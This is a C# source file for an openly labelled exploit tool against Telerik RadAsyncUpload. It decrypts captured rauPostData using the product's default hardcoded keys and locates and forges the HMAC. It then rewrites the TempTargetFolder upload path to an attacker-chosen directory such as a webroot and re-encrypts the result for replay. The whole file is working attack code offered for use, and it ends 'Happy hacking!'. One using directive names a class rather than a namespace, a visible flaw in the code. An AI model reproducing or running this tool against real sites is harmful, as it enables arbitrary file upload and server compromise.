using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Configuration.Install.AssemblyInstaller;

namespace UnRadAsyncUpload {
    public class Program {
        static string password = "PrivateKeyForEncryptionOfRadAsyncUploadConfiguration";
        static string hashkey = "PrivateKeyForHashOfUploadConfiguration";

        public static void Main(string[] args) {
            //rauPostData encrypted base64 content
            string ciphertext = "";
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("RadAsyncUpload Arbitrary File Path Upload Exploitation\n");
            Console.WriteLine("This exploitation module written by @Ac3lives");
            Console.WriteLine("For a tutorial on using the exploit, visit http://www.acenyethehackerguy.com/2017/11/the-issue-asyncuploadhandler-in.html/");
            Console.WriteLine("Original exploit discovery by StraightBlast (https://github.com/straightblast/UnRadAsyncUpload/wiki)");
            Console.WriteLine("-------------------------------------------------------------------------------------------");
            Console.WriteLine("\nEnter the file which contains ONLY your encrypted rauPostData content, prior to the first ampersand: ");
            string filePath = Console.ReadLine();
            while(true)
            {
               try
                {
                    ciphertext = File.ReadAllText(filePath);
                    break;
                }
                catch
                {
                    Console.WriteLine("Error, invalid file name. Try again: ");
                    filePath = Console.ReadLine();
                } 
            }
            
            var decrypted = "";
            try
            {
                decrypted = Decrypt(ciphertext);  
            }
            catch
            {
                Console.WriteLine("\nERROR: Something went wrong decrypting the text in file {0}. \nERROR: Check to make sure all of the encrypted block was properly copied from rauPostData", filePath);
                Console.WriteLine("Would you like to see what was read in from the file? (yes/no): ");
                string answer = Console.ReadLine();
                if (answer.Equals("yes"))
                {
                    Console.WriteLine("\nText from file: {0}", ciphertext);
                }
                else
                {
                    Console.WriteLine("exiting program\nVisit https://acenyethehackerguy.com/index.php/blog/ for a usage tutorial");
                }
                return;
            }
            
            //Print out the decrypted block
            Console.WriteLine("--------------------------------------\nDecrypted rauPostData text: ");
            Console.WriteLine("--------------------------------------");
            Console.WriteLine(decrypted);

            //Split decrypted text into an array so that we can pull out the value of TempTargetFolder
            char[] delimiterChars = {','};
            string[] words = decrypted.Split(delimiterChars);
            int locationTempTargetFolder = 0;
            //Find location of TempTargetFolder
            foreach(string x in words)
            {
                if(x.Contains("TempTargetFolder"))
                {
                    locationTempTargetFolder = Array.IndexOf(words, x);
                    break;
                }
            }
        
            //Console.WriteLine("\nTempTargetFolder is at position {0}", locationTempTargetFolder);
            //Break apart TempTargetFolder by colon to extract the exact value
            string[] tempTargetFolderArray = words[locationTempTargetFolder].Replace("\"", string.Empty).Split(':');
            string tempTargetFolder = tempTargetFolderArray[1];
            //string tempTargetFolder = words[locationTempTargetFolder+1].Replace("\"", string.Empty);
            //Console.WriteLine("Encrypted value of tempTargetFolder: " + tempTargetFolder);

            //Determine if there is an HMAC. If so, find where it is in the string (Telerik Version 2017.1 and newer uses an HMAC)
            Console.WriteLine("\nDetermining if an HMAC was used...");
            //1. Try to decrypt the full tempTargetFolder value
            //2. If error, there is an HMAC, step backwards 1 by 1 until no error
            //3. if no error, proceed, there is no HMAC
            bool hasHMAC = false;
            var decryptedTargetFolder = "";
            try
            {
                decryptedTargetFolder = Decrypt(tempTargetFolder);
                Console.WriteLine("No HMAC was used");
                hasHMAC = false;
            }
            catch
            {
                Console.WriteLine("HMAC found. Testing to find cutoff location......");
                for (int i = tempTargetFolder.Length; i > 0; i--)
                {
                    try
                    {
                        decryptedTargetFolder = Decrypt(tempTargetFolder.Substring(0,i));
                        Console.WriteLine("Successfully located HMAC location");
                        hasHMAC = true;
                        break;
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            //char[] delimiterHmac = {'='};
            //string[] hmacParse = tempTargetFolder.Split(delimiterHmac);
            
            //Send tempTargetFolder to decryption
            //var decryptedTargetFolder = Decrypt(tempTargetFolder);
            Console.WriteLine("\nCurrent file path for uploads (decrypted TempTargetFolder): ");
            Console.WriteLine("------------------------------------------------------------------");
            Console.WriteLine(decryptedTargetFolder);

            //Prompt user for new upload path
            Console.WriteLine("\nEnter the FULL file path where you would like files to be uploaded (i.e. C:\\inetpub\\webroot\\website\\): ");
            string newFilePath = Console.ReadLine();
            //string newFilePath = @"C:\Program Files (x86)\Telerik\UI for ASP.NET AJAX R1 2017\Live Demos";
            Console.WriteLine("\nBeginning re-encryption process.........................\n\n");

            //Begin encryption of changed content
            string cipherPath = Encrypt(newFilePath);
            string payload;
            if(hasHMAC)
            {
                string hash = Hash256(cipherPath);
                string arbitraryPath = cipherPath + hash;
                string tempTargetReplace = "\"TempTargetFolder\":\"" + arbitraryPath + "\"";
                //Console.WriteLine("\nNew temptargetfolder (with HMAC): " + tempTargetReplace);
                words[locationTempTargetFolder] = tempTargetReplace;
                payload = string.Join(",", words);
            }
            else
            {
                string tempTargetReplace = "\"TempTargetFolder\":\"" + cipherPath + "\"";
                //Console.WriteLine("\nNew temptargetfolder: " + tempTargetReplace);
                words[locationTempTargetFolder] = tempTargetReplace;
                payload = string.Join(",", words);
            }

            Console.WriteLine("\n\n------------Encrypted Payload - Copy it back into rauPostData (before ampersand)-----------------------");
            string cipherPayload = Encrypt(payload);
            Console.WriteLine(cipherPayload);
            Console.WriteLine("\n\nProgram execution complete. Happy hacking! \n~Acelives");
        }

        internal static string Encrypt(string clearText) {
            byte[] bytes = Encoding.Unicode.GetBytes(clearText);
            byte[] rgbSalt = new byte[] {
                58,
                84,
                91,
                25,
                10,
                34,
                29,
                68,
                60,
                88,
                44,
                51,
                1
            };
            PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(password, rgbSalt);
            byte[] inArray = Encrypt(bytes, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16));
            return Convert.ToBase64String(inArray);
        }

        private static byte[] Encrypt(byte[] clearData, byte[] key, byte[] iv) {
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, new AesCryptoServiceProvider {
                 Key = key,
                 IV = iv
            }.CreateEncryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(clearData, 0, clearData.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }

        internal static string Decrypt(string encryptedString) {
            byte[] encryptedBytes = Convert.FromBase64String(encryptedString);
            byte[] rgbSalt = new byte[] {
                58,
                84,
                91,
                25,
                10,
                34,
                29,
                68,
                60,
                88,
                44,
                51,
                1
            };
            PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(password, rgbSalt);
            byte[] bytes = Decrypt(encryptedBytes, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16));
            return Encoding.Unicode.GetString(bytes);
        }

        private static byte[] Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv) {
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, new AesCryptoServiceProvider {
                Key = key,
                IV = iv
            }.CreateDecryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(encryptedBytes, 0, encryptedBytes.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }

        private static string Hash256(string input) {
            byte[] bytes = Encoding.UTF8.GetBytes(hashkey);
            string result;
            using(HMACSHA256 hMACSHA = new HMACSHA256(bytes)) {
                byte[] bytes2 = Encoding.UTF8.GetBytes(input);
                byte[] inArray = hMACSHA.ComputeHash(bytes2);
                result = Convert.ToBase64String(inArray);
            }
            return result;
        }
    }
} 